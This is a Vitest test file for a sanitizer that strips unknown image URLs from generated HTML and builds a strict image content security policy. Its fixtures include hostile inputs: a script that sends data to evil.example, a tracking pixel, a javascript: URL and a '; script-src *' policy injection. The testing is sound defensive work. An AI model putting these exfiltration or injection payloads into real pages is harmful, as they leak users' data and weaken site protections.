import { describe, expect, it } from "vitest";

import { cspSource, knownIn, sanitizeGeneratedHtml } from "../src/lib/htmlImages";
import { buildMiniAppDoc, miniAppCsp } from "../src/lib/miniApp";

const KNOWN = "https://images.example.com/zuni/cafe.jpg";
const corpus = `Zuni Café, 1658 Market St. og:image ${KNOWN} https://zunicafe.com/menu`;
const isKnown = knownIn(corpus);

describe("sanitizeGeneratedHtml", () => {
  it("keeps an image URL from evidence and allows exactly it", () => {
    const { html, images } = sanitizeGeneratedHtml(`<img src="${KNOWN}" alt="Zuni">`, isKnown);
    expect(html).toContain(KNOWN);
    expect(images).toEqual([KNOWN]);
  });

  it("strips an unknown image and drops the empty tag", () => {
    const { html, images } = sanitizeGeneratedHtml(
      `<div><img src="https://evil.example/pixel.png?u=me" alt=""><p>Hi</p></div>`,
      isKnown,
    );
    expect(html).toBe("<div><p>Hi</p></div>");
    expect(images).toEqual([]);
  });

  it("strips unknown url() in styles but keeps known ones", () => {
    const { html } = sanitizeGeneratedHtml(
      `<style>.a{background:url(https://evil.example/a.png)}.b{background:url("${KNOWN}")}</style><div style="background-image:url('https://evil.example/b.png')"></div>`,
      isKnown,
    );
    expect(html).not.toContain("evil.example");
    expect(html).toContain(`url("${KNOWN}")`);
    expect(html).toContain("url()");
  });

  it("filters srcset candidates one by one", () => {
    const { html, images } = sanitizeGeneratedHtml(
      `<img src="${KNOWN}" srcset="https://evil.example/2x.jpg 2x, ${KNOWN} 1x, //cdn.evil.example/3x.jpg 3x">`,
      isKnown,
    );
    expect(html).toContain(`srcset="${KNOWN} 1x"`);
    expect(html).not.toContain("evil");
    expect(images).toEqual([KNOWN]);
  });

  it("removes unknown URLs in script strings and protocol-relative URLs", () => {
    const { html } = sanitizeGeneratedHtml(
      `<script>new Image().src = "https://evil.example/x?d=" + data;</script><img src='//evil.example/y.png'>`,
      isKnown,
    );
    expect(html).not.toContain("evil.example");
  });

  it("keeps known links and their trailing punctuation", () => {
    const { html } = sanitizeGeneratedHtml(`<p>Menu: https://zunicafe.com/menu.</p>`, isKnown);
    expect(html).toBe("<p>Menu: https://zunicafe.com/menu.</p>");
  });
});

describe("image CSP", () => {
  it("lists exact https sources only", () => {
    expect(cspSource("https://images.example.com/a b.jpg?x=1")).toBe("https://images.example.com/a%20b.jpg");
    expect(cspSource("http://images.example.com/a.jpg")).toBeNull();
    expect(cspSource("javascript:alert(1)")).toBeNull();
    expect(miniAppCsp([KNOWN])).toContain(`img-src data: blob: ${KNOWN};`);
    expect(miniAppCsp()).toContain("img-src data: blob:;");
  });

  it("never lets a malformed source into the policy", () => {
    const doc = buildMiniAppDoc("<p>x</p>", "light", ["https://a.example/x.jpg; script-src *", KNOWN]);
    expect(doc).not.toContain("script-src *");
    expect(doc).toContain(KNOWN);
  });
});
